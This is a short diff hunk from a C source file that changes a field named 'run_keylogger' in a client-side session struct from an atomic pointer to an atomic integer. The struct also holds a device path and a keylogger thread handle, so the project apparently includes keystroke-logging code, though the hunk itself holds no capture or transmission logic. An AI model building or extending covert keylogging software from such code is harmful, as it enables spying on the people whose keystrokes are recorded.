@@ -42,7 +42,7 @@ struct packet_data {
 struct session_info {
 #ifdef CLIENT_BUILD
     struct client_options * client_options_;
-    _Atomic int * run_keylogger;
+    _Atomic int run_keylogger;
     char * device_path;
     pthread_t keylogger_thread;
 #endif
